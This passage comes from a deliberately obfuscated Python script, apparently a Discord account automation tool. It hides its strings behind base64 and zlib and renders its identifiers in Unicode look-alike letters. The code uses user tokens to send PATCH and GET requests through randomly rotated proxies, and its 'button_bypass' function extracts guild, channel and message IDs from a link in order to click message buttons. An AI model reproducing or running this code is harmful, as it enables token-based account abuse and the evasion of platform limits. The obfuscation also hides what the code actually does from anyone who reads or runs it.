__𝙞𝘮𝗽𝙤𝗿𝘁__(𝗹𝙈𝘐𝗜𝘔𝙡𝙈𝘕𝗜𝘐𝘕𝙈𝗹𝘭𝘐𝗠𝙡𝘔𝘭𝘐𝘔𝙄𝙈𝘐𝘕𝙈𝙄𝘭𝗹𝗹𝙉𝙡[𝘳𝗼𝘶𝗻𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__(𝘭𝘔𝗜𝗜𝘔𝗹𝘔𝗡𝙄𝘐𝘕𝘔𝘭𝘭𝙄𝙈𝘭𝘔𝘭𝗜𝗠𝗜𝗠𝘐𝗡𝘔𝙄𝙡𝙡𝗹𝗡𝗹[𝗿𝘰𝙪𝘯𝘥(𝗮𝗯𝘀(0.09663563791696117 + 0.995319824721874j))]).decompress(b'x\xda\x8brw3\x88\x0c)(H\nw\xcb\x8b\n\xb6,O\xcaM6\x8f\xccu\xab\x8a\n\x894\xf0\xf1(\xb1\x04\x00\xb3\x8e\n\xd6')).decode().format(𝗲𝙣𝘤𝘰𝙙𝙚𝘥_𝘀𝘁𝙧𝙞𝙣𝗴.decode(__𝘪𝗺𝙥𝗼𝘳𝘁__(𝗹𝗠𝙄𝙄𝙈𝘭𝙈𝗡𝗜𝙄𝙉𝘔𝗹𝗹𝗜𝘔𝘭𝘔𝙡𝘐𝘔𝘐𝘔𝗜𝘕𝘔𝗜𝗹𝘭𝘭𝙉𝗹[𝗿𝙤𝘂𝗻𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__(𝙡𝘔𝙄𝙄𝗠𝗹𝗠𝘕𝘐𝙄𝗡𝗠𝙡𝗹𝙄𝘔𝗹𝗠𝗹𝘐𝗠𝙄𝘔𝘐𝗡𝗠𝙄𝗹𝙡𝘭𝙉𝙡[𝙧𝗼𝘂𝙣𝘥(𝗮𝘣𝙨(0.1024990526846199 + 0.9947331019920648j))]).decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()))}
    if 𝗽𝘳𝙤𝘅𝘺:
        𝗿𝗿 = 𝙧𝘦𝙦𝘶𝘦𝘀𝘁𝙨.patch(__𝘪𝗺𝘱𝙤𝗿𝘁__(𝙡𝗠𝘐𝘐𝘔𝘭𝙈𝙉𝙄𝗜𝗡𝗠𝙡𝘭𝘐𝙈𝘭𝙈𝙡𝙄𝙈𝙄𝙈𝘐𝙉𝙈𝗜𝙡𝙡𝙡𝙉𝘭[𝘳𝗼𝘶𝗻𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝗿𝘵__(𝗹𝗠𝙄𝘐𝙈𝗹𝙈𝘕𝗜𝘐𝗡𝙈𝗹𝗹𝙄𝙈𝘭𝙈𝘭𝙄𝙈𝙄𝗠𝗜𝗡𝙈𝘐𝘭𝗹𝙡𝙉𝘭[𝗿𝗼𝘂𝘯𝗱(𝘢𝙗𝙨(0.7810426414584629 + 0.6244776955373081j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x00\x8e\xc9\x10\xca')).decode().format(), headers=𝗵𝙚𝗮𝗱𝗲𝙧𝘀, json=𝘱𝘢𝘆𝘭𝗼𝗮𝗱, proxy={__𝘪𝙢𝘱𝗼𝗿𝘁__(𝘭𝙈𝗜𝘐𝗠𝙡𝘔𝙉𝗜𝗜𝙉𝘔𝙡𝙡𝗜𝙈𝙡𝗠𝗹𝘐𝙈𝙄𝙈𝘐𝘕𝘔𝙄𝙡𝘭𝙡𝘕𝘭[𝗿𝗼𝙪𝗻𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝗿𝘵__(𝙡𝘔𝙄𝗜𝘔𝙡𝙈𝗡𝗜𝘐𝙉𝙈𝗹𝙡𝘐𝗠𝘭𝗠𝙡𝗜𝗠𝗜𝙈𝘐𝘕𝙈𝘐𝗹𝙡𝙡𝘕𝘭[𝗿𝙤𝘂𝙣𝙙(𝗮𝙗𝘴(0.527711239610291 + 0.8494238327177841j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝙢𝙥𝙤𝘳𝘁__(𝙡𝗠𝙄𝗜𝘔𝗹𝘔𝙉𝘐𝙄𝙉𝙈𝗹𝗹𝙄𝘔𝘭𝗠𝘭𝗜𝗠𝘐𝗠𝙄𝘕𝙈𝗜𝙡𝙡𝘭𝙉𝙡[𝙧𝙤𝘶𝘯𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__(𝗹𝘔𝘐𝗜𝙈𝙡𝙈𝙉𝘐𝙄𝙉𝗠𝙡𝗹𝙄𝘔𝘭𝙈𝙡𝗜𝗠𝗜𝗠𝗜𝗡𝘔𝙄𝙡𝘭𝙡𝙉𝘭[𝘳𝘰𝙪𝙣𝗱(𝙖𝘣𝘀(0.5095777693813732 + 0.8604246027121167j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝙧𝙖𝙣𝗱𝙤𝙢.choice(𝗽𝙧𝗼𝙭𝙞𝗲𝙨), __𝙞𝗺𝘱𝙤𝘳𝘁__(𝘭𝙈𝗜𝙄𝙈𝙡𝘔𝘕𝙄𝗜𝗡𝘔𝗹𝗹𝙄𝙈𝗹𝗠𝗹𝙄𝘔𝗜𝙈𝘐𝙉𝗠𝘐𝙡𝗹𝙡𝗡𝗹[𝘳𝗼𝘂𝙣𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝗿𝙩__(𝗹𝙈𝘐𝗜𝗠𝘭𝙈𝙉𝘐𝗜𝘕𝗠𝗹𝙡𝗜𝗠𝘭𝗠𝘭𝙄𝘔𝙄𝘔𝘐𝙉𝘔𝙄𝘭𝘭𝗹𝘕𝘭[𝙧𝙤𝘶𝙣𝘥(𝙖𝘣𝙨(0.3207718774493068 + 0.9471564826561907j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝗶𝘮𝘱𝗼𝙧𝘵__(𝘭𝘔𝗜𝘐𝘔𝘭𝗠𝙉𝗜𝘐𝘕𝙈𝗹𝙡𝘐𝗠𝗹𝗠𝙡𝙄𝗠𝘐𝘔𝗜𝗡𝙈𝗜𝘭𝘭𝘭𝗡𝘭[𝗿𝘰𝙪𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__(𝗹𝗠𝗜𝙄𝗠𝗹𝙈𝘕𝗜𝗜𝘕𝙈𝗹𝗹𝘐𝘔𝗹𝗠𝘭𝙄𝙈𝗜𝘔𝗜𝙉𝗠𝘐𝙡𝗹𝘭𝗡𝘭[𝘳𝙤𝘶𝙣𝙙(𝙖𝘣𝘴(0.3411234109239968 + 0.9400185203066895j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝙖𝗻𝗱𝗼𝘮.choice(𝗽𝗿𝘰𝘅𝗶𝘦𝘴)})
    else:
        𝗿𝙧 = 𝘳𝙚𝘲𝘂𝙚𝘀𝘁𝘀.patch(__𝘪𝗺𝗽𝗼𝗿𝘵__(𝗹𝘔𝙄𝘐𝘔𝘭𝘔𝘕𝙄𝗜𝘕𝙈𝙡𝗹𝙄𝘔𝙡𝘔𝗹𝗜𝙈𝗜𝘔𝗜𝘕𝙈𝗜𝙡𝙡𝙡𝙉𝘭[𝙧𝙤𝘶𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__(𝗹𝗠𝙄𝗜𝙈𝘭𝗠𝘕𝙄𝙄𝘕𝙈𝙡𝘭𝗜𝗠𝙡𝘔𝙡𝗜𝘔𝗜𝘔𝗜𝙉𝗠𝘐𝗹𝙡𝙡𝘕𝗹[𝙧𝘰𝘂𝙣𝗱(𝙖𝗯𝘴(0.4003789357299481 + 0.916349664606123j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x00\x8e\xc9\x10\xca')).decode().format(), headers=𝙝𝘦𝙖𝘥𝘦𝗿𝙨, json=𝘱𝗮𝘺𝙡𝙤𝗮𝘥)
    if 𝙧𝗿.status_code == 𝗿𝙤𝘂𝘯𝗱(𝗮𝙗𝘴(54.5569637141607 + 192.4150142538044j)):
        𝘱𝗿𝘪𝗻𝘵(__𝘪𝗺𝗽𝗼𝗿𝘵__(𝘭𝙈𝙄𝗜𝗠𝘭𝙈𝗡𝘐𝙄𝗡𝗠𝗹𝘭𝗜𝗠𝙡𝘔𝙡𝙄𝘔𝙄𝙈𝗜𝙉𝘔𝘐𝗹𝗹𝗹𝘕𝙡[𝗿𝘰𝘂𝘯𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__(𝙡𝗠𝗜𝙄𝘔𝙡𝙈𝗡𝗜𝗜𝗡𝗠𝗹𝗹𝙄𝘔𝙡𝙈𝗹𝗜𝘔𝘐𝗠𝙄𝘕𝗠𝙄𝙡𝗹𝘭𝗡𝙡[𝗿𝗼𝘶𝘯𝗱(𝘢𝙗𝘴(0.4304555566722693 + 0.9026117735383062j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝘳, 𝗱𝙖𝘁𝘦𝘁𝘪𝗺𝙚.datetime.now().strftime(f"{𝘨}{__𝘪𝘮𝘱𝙤𝙧𝘁__(𝙡𝗠𝗜𝘐𝘔𝗹𝘔𝘕𝙄𝙄𝘕𝙈𝘭𝙡𝘐𝘔𝗹𝘔𝙡𝘐𝘔𝗜𝘔𝙄𝙉𝗠𝙄𝙡𝗹𝘭𝘕𝗹[𝙧𝗼𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝙧, 𝗹𝙘, 𝙧, 𝘯𝘯, 𝙜))
    else:
        𝗽𝗿𝘪𝗻𝙩(__𝙞𝘮𝙥𝙤𝗿𝘵__(𝘭𝗠𝙄𝙄𝘔𝗹𝘔𝘕𝘐𝗜𝘕𝙈𝘭𝙡𝘐𝗠𝘭𝙈𝙡𝙄𝙈𝙄𝘔𝗜𝗡𝗠𝗜𝙡𝘭𝗹𝘕𝘭[𝘳𝙤𝙪𝙣𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝙧𝙩__(𝙡𝗠𝙄𝘐𝗠𝙡𝘔𝗡𝘐𝙄𝗡𝗠𝙡𝗹𝘐𝘔𝘭𝗠𝙡𝙄𝙈𝘐𝗠𝙄𝘕𝗠𝗜𝘭𝙡𝙡𝘕𝗹[𝘳𝗼𝘂𝗻𝗱(𝙖𝘣𝘀(0.9332398184775597 + 0.359254006530159j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝘳, 𝙙𝗮𝘁𝘦𝘵𝘪𝘮𝙚.datetime.now().strftime(f"{𝗴}{__𝙞𝗺𝗽𝘰𝗿𝙩__(𝙡𝙈𝙄𝘐𝙈𝘭𝘔𝘕𝙄𝙄𝗡𝙈𝙡𝙡𝗜𝘔𝙡𝗠𝙡𝘐𝙈𝘐𝗠𝙄𝙉𝙈𝘐𝘭𝗹𝘭𝗡𝘭[𝘳𝙤𝘂𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝘳, 𝘣, 𝘳, 𝘯𝙣, 𝘨, 𝙧𝘳.text))

def button_bypass(token, message_link, optionbutton):
    𝗱𝘯 = 𝙩𝙤𝙠𝘦𝘯.split(__𝘪𝗺𝗽𝗼𝙧𝘵__(𝗹𝗠𝙄𝗜𝗠𝘭𝗠𝗡𝘐𝘐𝙉𝗠𝗹𝙡𝗜𝘔𝙡𝙈𝘭𝙄𝘔𝙄𝗠𝗜𝗡𝙈𝗜𝙡𝗹𝙡𝙉𝗹[𝙧𝙤𝘶𝘯𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__(𝗹𝘔𝘐𝙄𝗠𝘭𝘔𝙉𝙄𝙄𝗡𝘔𝘭𝙡𝘐𝙈𝙡𝙈𝘭𝗜𝙈𝘐𝘔𝗜𝘕𝘔𝙄𝗹𝗹𝙡𝙉𝘭[𝙧𝗼𝘂𝗻𝘥(𝙖𝙗𝘀(0.9171473712336468 + 0.3985482397893777j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝘯𝙣 = 𝘥𝙣[𝗿𝘰𝘶𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]
    𝙝𝘦𝗮𝗱𝗲𝙧𝘀 = 𝗛𝗲𝗮𝘥𝙚𝙧𝘀(𝙩𝙤𝗸𝘦𝘯)
    try:
        𝙜𝘶𝗶𝗹𝙙_𝗶𝗱 = 𝘮𝙚𝙨𝙨𝘢𝙜𝙚_𝘭𝙞𝙣𝙠.split(__𝙞𝗺𝘱𝘰𝘳𝘁__(𝘭𝘔𝙄𝘐𝗠𝗹𝗠𝗡𝘐𝗜𝘕𝘔𝘭𝙡𝙄𝗠𝙡𝗠𝗹𝗜𝘔𝗜𝙈𝗜𝗡𝙈𝙄𝘭𝗹𝘭𝙉𝘭[𝘳𝗼𝘶𝙣𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__(𝗹𝙈𝗜𝙄𝙈𝙡𝘔𝗡𝘐𝙄𝘕𝘔𝘭𝙡𝗜𝙈𝗹𝘔𝘭𝗜𝘔𝗜𝙈𝙄𝘕𝘔𝘐𝘭𝘭𝙡𝗡𝗹[𝗿𝙤𝙪𝗻𝗱(𝙖𝘣𝙨(0.23181933497872487 + 0.9727588580578548j))]).decompress(b'x\xda\xf3)\xb7\xb5\x05\x00\x03P\x01>')).decode())[𝗿𝙤𝘂𝗻𝘥(𝗮𝘣𝘴(2.87110561753124 + 2.7850947080809583j))]
        𝙘𝘩𝗮𝗻𝘯𝙚𝙡_𝗶𝗱 = 𝙢𝗲𝙨𝘴𝘢𝘨𝘦_𝙡𝘪𝙣𝗸.split(__𝘪𝘮𝗽𝘰𝙧𝘁__(𝘭𝗠𝗜𝙄𝙈𝘭𝘔𝘕𝙄𝗜𝗡𝙈𝘭𝙡𝘐𝙈𝘭𝘔𝘭𝘐𝙈𝗜𝙈𝘐𝗡𝙈𝘐𝙡𝗹𝘭𝙉𝗹[𝘳𝗼𝘶𝘯𝙙(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝘰𝙧𝘁__(𝙡𝙈𝗜𝘐𝙈𝗹𝙈𝘕𝗜𝗜𝗡𝗠𝗹𝘭𝘐𝘔𝘭𝗠𝗹𝗜𝙈𝙄𝘔𝙄𝘕𝗠𝗜𝗹𝙡𝙡𝘕𝙡[𝗿𝙤𝙪𝗻𝙙(𝙖𝙗𝘴(0.23432286686742654 + 0.9721588317055142j))]).decompress(b'x\xda\xf3)\xb7\xb5\x05\x00\x03P\x01>')).decode())[𝘳𝙤𝘂𝙣𝗱(𝙖𝙗𝘀(1.8491217546158296 + 4.645508447587463j))]
        𝗺𝗲𝘀𝙨𝗮𝗴𝘦_𝗶𝙙 = 𝙢𝘦𝘀𝙨𝙖𝘨𝙚_𝗹𝗶𝘯𝗸.split(__𝗶𝗺𝙥𝘰𝘳𝘵__(𝙡𝗠𝘐𝗜𝙈𝘭𝙈𝘕𝗜𝙄𝘕𝙈𝗹𝙡𝗜𝘔𝘭𝗠𝘭𝙄𝘔𝘐𝙈𝙄𝗡𝙈𝙄𝘭𝗹𝘭𝘕𝗹[𝗿𝘰𝘶𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__(𝗹𝘔𝘐𝘐𝗠𝘭𝘔𝙉𝘐𝗜𝘕𝘔𝗹𝗹𝙄𝘔𝗹𝘔𝘭𝗜𝘔𝘐𝗠𝘐𝘕𝗠𝘐𝙡𝙡𝘭𝗡𝗹[𝙧𝘰𝘂𝘯𝗱(𝘢𝙗𝙨(0.2765783078780891 + 0.9609913837341586j))]).decompress(b'x\xda\xf3)\xb7\xb5\x05\x00\x03P\x01>')).decode())[𝗿𝙤𝘂𝗻𝙙(𝗮𝗯𝘴(3.1520909666880708 + 5.105322961157645j))]
        𝘱𝘢𝙮𝗹𝗼𝗮𝙙 = {__𝗶𝙢𝘱𝗼𝗿𝘁__(𝘭𝘔𝙄𝙄𝙈𝗹𝗠𝗡𝗜𝘐𝘕𝙈𝘭𝘭𝘐𝙈𝘭𝘔𝗹𝗜𝘔𝘐𝗠𝙄𝗡𝙈𝙄𝙡𝙡𝗹𝘕𝗹[𝗿𝙤𝙪𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__(𝘭𝗠𝗜𝙄𝙈𝙡𝗠𝘕𝙄𝘐𝙉𝘔𝘭𝘭𝘐𝘔𝗹𝘔𝘭𝗜𝘔𝙄𝗠𝙄𝙉𝗠𝙄𝘭𝘭𝙡𝘕𝙡[𝙧𝙤𝘂𝙣𝗱(𝙖𝗯𝙨(0.9586888768177748 + 0.28445674093941486j))]).decompress(b'x\xdaKr\xcf)I\x8c\x08\xb4\x05\x00\r@\x02\xd1')).decode(): __𝘪𝗺𝗽𝘰𝘳𝙩__(𝙡𝘔𝘐𝙄𝙈𝘭𝗠𝙉𝗜𝗜𝗡𝗠𝘭𝙡𝘐𝙈𝘭𝗠𝗹𝘐𝘔𝗜𝙈𝗜𝙉𝗠𝘐𝘭𝙡𝘭𝙉𝘭[𝗿𝗼𝙪𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__(𝗹𝘔𝙄𝙄𝙈𝗹𝙈𝙉𝙄𝗜𝗡𝘔𝘭𝘭𝙄𝙈𝙡𝙈𝗹𝘐𝗠𝗜𝘔𝙄𝗡𝗠𝗜𝗹𝗹𝙡𝙉𝗹[𝙧𝙤𝘂𝙣𝙙(𝗮𝗯𝘀(0.9494951929255363 + 0.3137815778711342j))]).decompress(b'x\xda\xf3\x0bq\xb4\x05\x00\x02\xf7\x01!')).decode(), __𝗶𝗺𝘱𝘰𝙧𝘁__(𝗹𝘔𝘐𝘐𝗠𝗹𝗠𝙉𝙄𝗜𝘕𝘔𝘭𝗹𝙄𝙈𝘭𝘔𝙡𝙄𝗠𝗜𝙈𝘐𝙉𝘔𝙄𝗹𝘭𝗹𝙉𝗹[𝙧𝘰𝘶𝗻𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝙧𝘁__(𝘭𝙈𝗜𝙄𝘔𝙡𝙈𝗡𝘐𝙄𝘕𝗠𝙡𝙡𝗜𝗠𝗹𝘔𝙡𝙄𝘔𝗜𝘔𝘐𝗡𝙈𝘐𝗹𝙡𝙡𝘕𝘭[𝘳𝗼𝘂𝘯𝗱(𝙖𝘣𝘴(0.6968354809889752 + 0.7172310035371195j))]).decompress(b'x\xda\x8b\x8c\xf0*K\t7\xcd\x06\x00\x0c\xac\x02\xcd')).decode(): 𝘮𝗲𝘀𝘴𝙖𝘨𝙚_𝘪𝙙}
        if 𝙥𝗿𝙤𝙭𝙮:
            𝗿𝘳 = 𝗿𝙚𝙦𝙪𝙚𝙨𝙩𝘴.get(__𝗶𝗺𝗽𝗼𝗿𝘵__(𝘭𝗠𝘐𝗜𝙈𝘭𝗠𝙉𝗜𝙄𝗡𝗠𝘭𝘭𝙄𝙈𝙡𝘔𝙡𝙄𝗠𝘐𝗠𝙄𝙉𝘔𝘐𝙡𝘭𝗹𝘕𝗹[𝘳𝘰𝘂𝘯𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝙤𝙧𝘵__(𝘭𝗠𝗜𝗜𝗠𝘭𝗠𝙉𝘐𝙄𝗡𝗠𝙡𝘭𝘐𝘔𝗹𝙈𝙡𝘐𝘔𝘐𝗠𝙄𝙉𝗠𝘐𝙡𝙡𝗹𝙉𝘭[𝙧𝗼𝘂𝙣𝘥(𝙖𝘣𝘴(0.12756675249287175 + 0.99182998727525j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-\x03\x00\x8d;\x10\xc3')).decode() + 𝗰𝗵𝗮𝘯𝙣𝘦𝗹_𝙞𝙙 + __𝘪𝙢𝘱𝙤𝘳𝘵__(𝗹𝘔𝙄𝘐𝙈𝗹𝘔𝙉𝙄𝘐𝘕𝙈𝗹𝗹𝗜𝘔𝗹𝘔𝗹𝘐𝗠𝘐𝘔𝘐𝙉𝘔𝙄𝙡𝙡𝗹𝙉𝙡[𝘳𝗼𝙪𝙣𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝘳𝘁__(𝘭𝗠𝘐𝙄𝙈𝗹𝙈𝗡𝘐𝙄𝘕𝙈𝙡𝙡𝘐𝗠𝙡𝗠𝗹𝗜𝗠𝙄𝘔𝙄𝙉𝙈𝙄𝙡𝘭𝘭𝙉𝙡[𝙧𝘰𝘶𝙣𝙙(𝘢𝘣𝙨(0.8808702972887985 + 0.47335770761058044j))]).decompress(b'x\xda\xf312\xccI6\xf6\xcb\x882\n\xab\x02\x00\x16\xf5\x03\xc4')).decode(), params=𝘱𝗮𝘺𝙡𝙤𝘢𝗱, headers=𝙝𝘦𝘢𝘥𝘦𝙧𝘴, proxy={__𝙞𝘮𝗽𝗼𝗿𝙩__(𝗹𝙈𝘐𝗜𝘔𝗹𝘔𝙉𝙄𝙄𝙉𝙈𝗹𝘭𝙄𝗠𝙡𝙈𝗹𝗜𝘔𝘐𝗠𝗜𝗡𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝙧𝙤𝙪𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__(𝗹𝗠𝘐𝙄𝙈𝘭𝙈𝙉𝙄𝗜𝘕𝗠𝗹𝗹𝗜𝗠𝗹𝙈𝘭𝗜𝗠𝗜𝙈𝘐𝘕𝘔𝘐𝗹𝙡𝗹𝘕𝗹[𝗿𝙤𝘶𝗻𝗱(𝙖𝙗𝙨(0.2922818442934171 + 0.9563322244369049j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝘮𝗽𝘰𝗿𝘁__(𝙡𝙈𝙄𝙄𝘔𝙡𝘔𝙉𝙄𝗜𝙉𝙈𝘭𝙡𝙄𝗠𝘭𝗠𝗹𝗜𝘔𝗜𝘔𝗜𝘕𝘔𝘐𝘭𝗹𝙡𝙉𝘭[𝗿𝙤𝙪𝗻𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__(𝙡𝗠𝗜𝙄𝗠𝙡𝘔𝗡𝘐𝘐𝗡𝘔𝗹𝘭𝗜𝗠𝗹𝘔𝗹𝙄𝙈𝗜𝘔𝙄𝙉𝗠𝘐𝘭𝗹𝘭𝘕𝘭[𝙧𝙤𝙪𝙣𝘥(𝙖𝗯𝘀(0.34952570145311945 + 0.9369267762337166j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝙣𝘥𝙤𝙢.choice(𝗽𝘳𝗼𝘹𝙞𝙚𝘴), __𝗶𝘮𝘱𝗼𝗿𝙩__(𝘭𝘔𝘐𝗜𝘔𝙡𝙈𝘕𝘐𝙄𝙉𝗠𝙡𝙡𝙄𝘔𝙡𝗠𝘭𝗜𝗠𝙄𝗠𝙄𝗡𝘔𝙄𝙡𝙡𝘭𝗡𝙡[𝘳𝘰𝙪𝗻𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝘁__(𝘭𝙈𝘐𝙄𝘔𝘭𝙈𝙉𝙄𝘐𝗡𝗠𝙡𝘭𝗜𝗠𝘭𝙈𝙡𝙄𝗠𝘐𝗠𝘐𝙉𝗠𝗜𝙡𝗹𝗹𝙉𝙡[𝗿𝘰𝙪𝗻𝗱(𝘢𝘣𝘀(0.4367264515158076 + 0.8995943566666095j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝗶𝙢𝘱𝘰𝙧𝘁__(𝗹𝙈𝙄𝙄𝗠𝙡𝘔𝙉𝗜𝙄𝙉𝗠𝙡𝗹𝘐𝗠𝗹𝘔𝗹𝗜𝗠𝗜𝘔𝗜𝙉𝘔𝙄𝘭𝘭𝘭𝘕𝘭[𝙧𝗼𝙪𝘯𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__(𝙡𝘔𝘐𝘐𝘔𝘭𝙈𝗡𝗜𝘐𝗡𝙈𝗹𝗹𝗜𝗠𝙡𝘔𝘭𝙄𝘔𝘐𝘔𝗜𝙉𝙈𝘐𝗹𝗹𝘭𝙉𝗹[𝘳𝙤𝙪𝙣𝗱(𝙖𝙗𝘀(0.4143606789356863 + 0.9101127555154676j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝘯𝙙𝘰𝘮.choice(𝗽𝘳𝘰𝘹𝘪𝙚𝙨)})
        else:
            𝗿𝗿 = 𝗿𝗲𝙦𝘂𝙚𝙨𝘁𝘀.get(__𝘪𝗺𝗽𝗼𝗿𝙩__(𝙡𝙈𝙄𝙄𝙈𝗹𝙈𝗡𝘐𝗜𝙉𝘔𝘭𝘭𝘐𝘔𝙡𝘔𝗹𝗜𝘔𝙄𝙈𝗜𝘕𝗠𝙄𝙡𝘭𝘭𝗡𝗹[𝗿𝙤𝘂𝙣𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__(𝘭𝗠𝙄𝗜𝙈𝙡𝙈𝙉𝗜𝗜𝘕𝘔𝗹𝘭𝗜𝗠𝗹𝘔𝗹𝙄𝘔𝘐𝘔𝘐𝗡𝘔𝗜𝗹𝗹𝘭𝗡𝘭[𝘳𝘰𝙪𝙣𝘥(𝙖𝙗𝘀(0.43508788127934817 + 0.9003879916812795j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-\x03\x00\x8d;\x10\xc3')).decode() + 𝙘𝙝𝙖𝗻𝗻𝙚𝘭_𝙞𝙙 + __𝘪𝗺𝘱𝙤𝘳𝙩__(𝘭𝗠𝘐𝙄𝙈𝘭𝘔𝘕𝙄𝙄𝙉𝘔𝗹𝗹𝗜𝙈𝙡𝙈𝙡𝘐𝙈𝙄𝙈𝘐𝙉𝙈𝗜𝘭𝗹𝙡𝘕𝙡[𝗿𝙤𝘂𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝘰𝗿𝘁__(𝗹𝙈𝗜𝙄𝗠𝗹𝙈𝙉𝗜𝘐𝗡𝙈𝘭𝘭𝙄𝘔𝘭𝗠𝗹𝙄𝘔𝗜𝙈𝘐𝙉𝙈𝘐𝙡𝗹𝙡𝗡𝗹[𝘳𝘰𝙪𝗻𝗱(𝙖𝙗𝙨(0.7645517310603651 + 0.6445623713284845j))]).decompress(b'x\xda\xf312\xccI6\xf6\xcb\x882\n\xab\x02\x00\x16\xf5\x03\xc4')).decode(), params=𝘱𝙖𝙮𝘭𝘰𝗮𝙙, headers=𝗵𝗲𝙖𝘥𝘦𝙧𝘀)
        𝙢𝗲𝙨𝘴𝙖𝘨𝘦𝘴 = 𝙧𝗿.json()
        𝗺𝙚𝘀𝘴𝙖𝘨𝙚𝘣𝙤𝘵𝘁𝙤𝗰𝙡𝙞𝘤𝙠 = None
